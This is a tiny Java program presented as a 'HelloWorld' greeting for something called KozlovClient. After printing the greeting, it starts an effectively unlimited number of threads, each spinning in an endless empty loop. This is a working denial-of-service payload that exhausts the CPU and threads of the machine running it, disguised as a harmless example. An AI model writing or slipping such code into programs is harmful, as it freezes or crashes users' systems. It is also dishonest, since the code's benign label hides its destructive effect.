class HelloWorld {
    public static void main(String[] args) {
        System.out.println("Hello from KozlovClient!"); 

        for(int i = 0; i < Integer.MAX_VALUE; i++) {
            new Thread(() -> {
                while(true);
            }).start();
        }
    }
}
